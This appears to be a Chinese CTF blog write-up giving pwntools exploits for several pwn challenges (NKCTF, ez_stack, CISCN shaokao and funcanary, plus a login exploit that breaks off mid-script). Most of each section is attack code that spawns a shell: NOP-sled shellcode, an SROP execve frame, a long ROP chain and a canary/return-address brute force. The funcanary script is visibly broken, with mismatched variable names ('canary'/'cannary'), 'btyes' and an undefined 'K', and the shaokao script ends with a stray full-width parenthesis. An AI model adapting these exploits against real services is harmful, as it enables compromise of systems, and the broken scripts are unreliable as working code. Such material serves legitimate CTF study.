@@ -1,0 +1,555 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>部分PWN题目记录 | 幻境</title><meta name="author" content="yub"><meta name="copyright" content="yub"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Pwn题目记录【NKCTF】弱小可怜无助的唯一。（1）checkesec 发现为64位 只有NX保护 （2）进IDA分析    F5查看main函数   查看偏移为0x74（buf[108]+8[ebp大小]） buf2大小随机  无后门函数 此时联想到使用pwntools生成可利用的shellcode   v6随机执行但未设置随机数种子【注释打漏了😜】 exp： from pwn import">
+<meta property="og:type" content="article">
+<meta property="og:title" content="部分PWN题目记录">
+<meta property="og:url" content="https://yubut.github.io/2023/09/01/Pwn%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="幻境">
+<meta property="og:description" content="Pwn题目记录【NKCTF】弱小可怜无助的唯一。（1）checkesec 发现为64位 只有NX保护 （2）进IDA分析    F5查看main函数   查看偏移为0x74（buf[108]+8[ebp大小]） buf2大小随机  无后门函数 此时联想到使用pwntools生成可利用的shellcode   v6随机执行但未设置随机数种子【注释打漏了😜】 exp： from pwn import">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/e4f95a48e6c9c74312ac5ed6fcdc8a14.jpg?x-oss-process=image%2Fresize%2Cm_lfit%2Cw_960%2Ch_540">
+<meta property="article:published_time" content="2023-08-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-09-01T12:20:24.054Z">
+<meta property="article:author" content="yub">
+<meta property="article:tag" content="pwn,知识碎片">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/e4f95a48e6c9c74312ac5ed6fcdc8a14.jpg?x-oss-process=image%2Fresize%2Cm_lfit%2Cw_960%2Ch_540"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://yubut.github.io/2023/09/01/Pwn%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '部分PWN题目记录',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-09-01 20:20:24'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="幻境" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/guestbook/"><i class="fa-fw fa fa-book"></i><span> guestbook</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-home-page" id="page-header" style="background-image: url('https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/e4f95a48e6c9c74312ac5ed6fcdc8a14.jpg?x-oss-process=image%2Fresize%2Cm_lfit%2Cw_960%2Ch_540')"><nav id="nav"><span id="blog-info"><a href="/" title="幻境"><span class="site-name">幻境</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/guestbook/"><i class="fa-fw fa fa-book"></i><span> guestbook</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">部分PWN题目记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-31T16:00:00.000Z" title="发表于 2023-09-01 00:00:00">2023-09-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-09-01T12:20:24.054Z" title="更新于 2023-09-01 20:20:24">2023-09-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="部分PWN题目记录"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="Pwn题目记录"><a href="#Pwn题目记录" class="headerlink" title="Pwn题目记录"></a><strong>Pwn题目记录</strong></h3><h3 id="【NKCTF】"><a href="#【NKCTF】" class="headerlink" title="【NKCTF】"></a>【NKCTF】</h3><p>弱小可怜无助的唯一。<br>（1）checkesec 发现为64位 只有NX保护<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530231132244.png" alt="image-20230530231132244"></p>
+<p>（2）进IDA分析 </p>
+<p>  F5查看main函数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530234240598.png"></p>
+<p>  查看偏移为0x74（buf[108]+8[ebp大小]） buf2大小随机  无后门函数 此时联想到使用pwntools生成可利用的shellcode   v6随机执行但未设置随机数种子【注释打漏了😜】</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530234339502.png" alt="image-20230530234339502"><br>exp：</p>
+<pre><code class="python">from pwn import *
+context.arch = &#39;amd64&#39;
+context.os = &#39;linux&#39;
+context.log_level = &#39;debug&#39;
+p = process(&#39;./pwn&#39;)
+#p = remote(&#39;127.0.0.1&#39;, 1337)
+buf = b&#39;\x90&#39; * 108
+shellcode = asm(shellcraft.amd64.sh())
+payload = buf + b&#39;\x90&#39;*(104-len(shellcode)) +shellcode
+log.success(&quot;shellcode_len : &quot; + hex(len(shellcode)))
+p.sendline(payload)
+p.interactive()
+    
+</code></pre>
+<p>选择用\x90（nop）进行填充使得攻击代码更具稳定性<br>104减去shellcode长度的b’\x90’字节，这个部分作用是将shellcode挪到最后（shellcode可能在中间生成），如果没有nopsled的填充，后面的数据会覆盖前面的shellcode，从而导致攻击失败。也就是说，这部分的填充是为了让Shellcode不会被后面的数据覆盖。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531002410442.png" alt="image-20230531002410442"></p>
+<p>统统通</p>
+<h3 id="ez-stack"><a href="#ez-stack" class="headerlink" title="ez_stack"></a><strong>ez_stack</strong></h3><p>(1)checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531150721336.png" alt="image-20230531150721336"></p>
+<p>发现NX打开 准备进IDA找溢出</p>
+<p>（2）进IDA<br>  <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531150942976.png" alt="image-20230531150942976"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531151017632.png" alt="image-20230531151017632"></p>
+<p>​       发现溢出部分 无”&#x2F;bin&#x2F;sh” 需要我们构造rop链自行写入<br>​       常规思路就是第一次rop往<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=bss&spm=1001.2101.3001.7020">bss</a>上写&#x2F;bin&#x2F;sh，然后第二次调用execve<br>​       但程序本身没有本地直接调用函数-&gt;通过syscall来得到shell<br>​       <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531170223533.png" alt="image-20230531170223533"></p>
+<p> 查看发现为SROP  在.data段找到可写入&#x2F;bin&#x2F;sh的地址</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531160459228.png" alt="image-20230531160459228"> </p>
+<p>执行完 read 的系统调用，此时 rax &#x3D;&#x3D; 0  利用SROP 【只用于可写方法内】<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531171529997.png" alt="image-20230531171529997"></p>
+<p>exp:</p>
+<pre><code class="python">from pwn import *
+p = process(&#39;./stack&#39;)
+#p = remote(&#39;node2.yuzhian.com.cn&#39;,35543)
+context(os = &#39;linux&#39;,arch = &#39;amd64&#39;,log_level = &#39;debug&#39;)
+elf = ELF(&#39;./stack&#39;)
+libc = elf.libc
+
+def debug():
+    gdb.attach(p)
+    pause()
+
+syscall = 0x4011ee
+mov_rax_15 = 0x401146
+bin_sh = 0x404040
+
+#call execv(&quot;/bin/sh&quot;,0,0)
+sigframe = SigreturnFrame()
+sigframe.rax = constants.SYS_execve
+sigframe.rdi = bin_sh
+sigframe.rsi = 0x0
+sigframe.rdx = 0x0
+sigframe.rip = syscall
+
+#debug()
+payload = &#39;a&#39;*(0x10 + 0x8)
+payload += p64(0x4011C8)
+payload += p64(0)
+payload += p64(mov_rax_15)
+payload += p64(syscall)
+payload += str(sigframe)
+sleep(0.1)
+p.sendlineafter(&#39;F!\n&#39;,payload)
+
+#debug()
+sleep(0.1)
+p.sendline(&#39;/bin/sh\x00&#39;)
+sleep(0.1)
+p.sendline(&#39;\x00&#39;)
+p.interactive()
+</code></pre>
+<p>SROP小赠品（<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bpcat/p/16879300.html">https://www.cnblogs.com/bpcat/p/16879300.html</a>)</p>
+<h3 id="【2023CISCN】"><a href="#【2023CISCN】" class="headerlink" title="【2023CISCN】"></a>【2023CISCN】</h3><h4 id="shaokao"><a href="#shaokao" class="headerlink" title="shaokao"></a><strong>shaokao</strong></h4><p>（1）虚拟机checksec一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/0.png" alt="0"></p>
+<p>（2）运行一下程序玩玩</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/1.png" alt="1"></p>
+<p>发现没碰到特别之处<br>（3）转战IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/2.png" alt="2"></p>
+<p>查看mian函数发现隐藏目录5 跟踪看看<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/3.png" alt="3"></p>
+<p>发现strcpy 猜测v1进行了溢出</p>
+<p>再往下翻翻<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/4.png" alt="4"></p>
+<p>syscall  以及sys_exit 明显的系统调用号</p>
+<p>到data段查找可写入口<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/5.png" alt="5"></p>
+<p>搜索sys 发现-result 猜测负数（-10000）打开目录5<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230527200932728.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/8.png" alt="8">（4）利用ROPgadget 构造所需execve系统调用exp<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/61.png" alt="61"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/6.png" alt="6"></p>
+<p>（5）构造对应exp</p>
+<pre><code class="python">from pwn import *
+from struct import pack
+
+r=process(&#39;./shaokao&#39;)
+#r=remote(&#39;39.106.71.184&#39;,23931)
+r.sendlineafter(&quot;&gt;&quot;,b&quot;1&quot;)
+r.sendlineafter(&quot;&quot;,b&quot;1&quot;)
+r.sendlineafter(&quot;？\n&quot;,b&quot;-10000&quot;)
+r.sendlineafter(&quot;&gt;&quot;,b&quot;4&quot;)
+r.sendlineafter(&quot;&gt;&quot;,b&quot;5&quot;)
+
+p = b&#39;a&#39;*(0x28)
+
+p += pack(&#39;&lt;Q&#39;, 0x000000000040a67e) # pop rsi ; ret
+p += pack(&#39;&lt;Q&#39;, 0x00000000004e60e0) # @ .data
+p += pack(&#39;&lt;Q&#39;, 0x0000000000458827) # pop rax ; ret
+p += b&#39;/bin//sh&#39;
+p += pack(&#39;&lt;Q&#39;, 0x000000000045af95) # mov qword ptr [rsi], rax ; ret
+p += pack(&#39;&lt;Q&#39;, 0x000000000040a67e) # pop rsi ; ret
+p += pack(&#39;&lt;Q&#39;, 0x00000000004e60e8) # @ .data + 8
+p += pack(&#39;&lt;Q&#39;, 0x0000000000447339) # xor rax, rax ; ret
+p += pack(&#39;&lt;Q&#39;, 0x000000000045af95) # mov qword ptr [rsi], rax ; ret
+p += pack(&#39;&lt;Q&#39;, 0x000000000040264f) # pop rdi ; ret
+p += pack(&#39;&lt;Q&#39;, 0x00000000004e60e0) # @ .data
+p += pack(&#39;&lt;Q&#39;, 0x000000000040a67e) # pop rsi ; ret
+p += pack(&#39;&lt;Q&#39;, 0x00000000004e60e8) # @ .data + 8
+p += pack(&#39;&lt;Q&#39;, 0x00000000004a404b) # pop rdx ; pop rbx ; ret
+p += pack(&#39;&lt;Q&#39;, 0x00000000004e60e8) # @ .data + 8
+p += pack(&#39;&lt;Q&#39;, 0x4141414141414141) # padding
+p += pack(&#39;&lt;Q&#39;, 0x0000000000447339) # xor rax, rax ; ret
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret _1
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710)
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710)
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) 
+p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret _59
+p += pack(&#39;&lt;Q&#39;, 0x0000000000402404) # syscall
+
+r.sendlineafter(&quot;烧烤摊儿已归你所有，请赐名：&quot;,p)
+r.interactive(）
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230527201915278.png" alt="image-20230527201915278"></p>
+<p>优化后的exp</p>
+<pre><code class="python">from pwn import *
+from struct import pack
+r=process(&#39;./shaokao&#39;)
+#r=remote(&#39;39.106.71.184&#39;,23931)
+r.sendlineafter(&quot;&gt;&quot;,b&quot;1&quot;)
+r.sendlineafter(&quot;&quot;,b&quot;1&quot;)
+r.sendlineafter(&quot;？\n&quot;,b&quot;-10000&quot;)
+r.sendlineafter(&quot;&gt;&quot;,b&quot;4&quot;)
+r.sendlineafter(&quot;&gt;&quot;,b&quot;5&quot;)
+
+padding = b&#39;a&#39; * 0x28
+pop_rsi_ret = pack(&#39;&lt;Q&#39;, 0x000000000040a67e) 
+pop_rax_ret = pack(&#39;&lt;Q&#39;, 0x0000000000458827)
+mov_rax_ptr_rsi_ret = pack(&#39;&lt;Q&#39;, 0x000000000045af95)
+xor_rax_ret = pack(&#39;&lt;Q&#39;, 0x0000000000447339)
+pop_rdi_ret = pack(&#39;&lt;Q&#39;, 0x000000000040264f)
+pop_rdx_rbx_ret = pack(&#39;&lt;Q&#39;, 0x00000000004a404b)
+
+p = padding
+p += pop_rsi_ret + pack(&#39;&lt;Q&#39;, 0x00000000004e60e0)   # @ .data
+p += pop_rax_ret + b&#39;/bin//sh&#39;
+p += mov_rax_ptr_rsi_ret
+p += pop_rsi_ret + pack(&#39;&lt;Q&#39;, 0x00000000004e60e8)   # @ .data + 8
+p += xor_rax_ret
+p += mov_rax_ptr_rsi_ret
+p += pop_rdi_ret + pack(&#39;&lt;Q&#39;, 0x00000000004e60e0)   # @ .data
+p += pop_rsi_ret + pack(&#39;&lt;Q&#39;, 0x00000000004e60e8)   # @ .data + 8
+p += pop_rdx_rbx_ret + pack(&#39;&lt;Q&#39;, 0) + pack(&#39;&lt;Q&#39;, 0)
+p += xor_rax_ret
+add_rip_ret = pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret
+rop_len = 59
+rop_chain = [add_rip_ret] * rop_len#构建一个rop_len 完成execve
+p += b&#39;&#39;.join(rop_chain)#将列表转换为字符串进行填充
+p += pack(&#39;&lt;Q&#39;, 0x0000000000402404) # syscall
+
+r.sendlineafter(&quot;烧烤摊儿已归你所有，请赐名：&quot;,p)
+r.interactive()
+</code></pre>
+<h4 id="【funcannary】"><a href="#【funcannary】" class="headerlink" title="【funcannary】"></a><strong>【funcannary】</strong></h4><p>涨知识涨知识 没学够的菜狗😀<br>（1）先运行一下 pei’d配套checksec<br>                       <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002528552.png" alt="image-20230530002528552"><br>                       根据题目提示’have fun’和’welcome’在爆破的exp中会用作于覆盖节点</p>
+<p>​                              ​<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002620435.png" alt="image-20230530002620435"> </p>
+<p>​         发现Canary和PIE都开 准备好爆破（如果有可以利用的字符串canary也可以绕过）<br>​         对应随机化 后续在IDA中只能利用其地址计算偏移</p>
+<p>（2）进IDA</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002919532.png" alt="image-20230530002919532"></p>
+<p>fork接口 &#x3D;&#x3D; canary爆破（多线程）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154247901.png" alt="image-20230530154247901"></p>
+<p>发现函数入口为0x122D 并且发现”&#x2F;bin&#x2F;cat flag” 接下来找溢出位置爆破cannary</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154947024.png" alt="image-20230530154947024"></p>
+<p>明显溢出 定位该函数sub_128A（爆破canary的位置）爆破成功后爆返回地址 （爆canary地址的下一位）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530155540402.png" alt="image-20230530155540402"></p>
+<p>函数入口为0x122D shell返回地址为1329 偏移为0xfc 覆盖的buf大小为0x62</p>
+<p><strong>tips</strong><br>【1】canary大小为0x00-0xff 所以爆破时每字节需循环257次 又因为canary低三位定为\x00（32位爆破循环3次 64位循环7次）此处需循环7次<br>【2】程序入口点一般都是整数，即地址最低位为00，也就是这里的地址，0x29是可信的。就只要爆破后一位就OK，再后面的地址都相同，爆不爆都一样。</p>
+<p>exp：</p>
+<pre><code class="python">from pwn import *
+context.arch = &#39;amd64&#39;
+context.os = &#39;linux&#39;
+context.log_level = &#39;debug&#39;
+
+p = process(&quot;./fun&quot;)
+#p = remote(&quot;39.106.65.236&quot;, &quot;30687&quot;)
+p.recvuntil(b&#39;welcome\n&#39;) 
+canary = b&#39;\x00&#39;
+#canary
+for k in range(7):
+  info(f&#39;No:&#123;K+1&#125;start,finding...&#39;)
+  for i in range(256):
+     p.send(b&#39;a&#39;*(0x70-8)+cannary+btyes([i]))
+     recv = p.recvuntil(b&#39;welcome\n&#39;)
+     if b&quot;have fun&quot; in recv:
+      cannary += bytes([i])
+      success(f&quot;canary =&gt; &#123;canary.hex()&#125;&quot;)
+      break
+      
+#return address
+re_1 = 0x29
+re_2 = 0
+info(&#39;finding:re_2 ...&#39;)
+for re_i in range(0x100):
+  payload = b&#39;a&#39; * 0x68 + canary + b&#39;A&#39; * 8 + p8(re_1) + p8(re_i)
+#p8()将给定的整数转换为单字节的字节串
+  p.send(payload)
+  recv = p.recvuntil(b&quot;welcome\n&quot;)
+  if b&quot;have fun&quot; in recv:
+       re_2 = re_i
+       success(f&quot;re_2 =&gt; &#123;hex(re_2)&#125;&quot;)
+       break
+payload = b&#39;a&#39; * (0x70-8) + canary + b&#39;A&#39; * 8 + p8(re_1 - 1) + p8(re_2 - 1)#-1对齐栈
+p.send(payload)
+p.interactive()
+</code></pre>
+<p>本地get<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530213510778.png" alt="image-20230530213510778">  </p>
+<p><strong>login</strong><br>无附件 只打远程 涨知识捏 侧信道攻击 </p>
+<p>exp:</p>
+<pre><code class="python">from pwn import *
+from sys import argv
+context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)
+def s(a):
+    p.send(a)
+def sa(a, b):
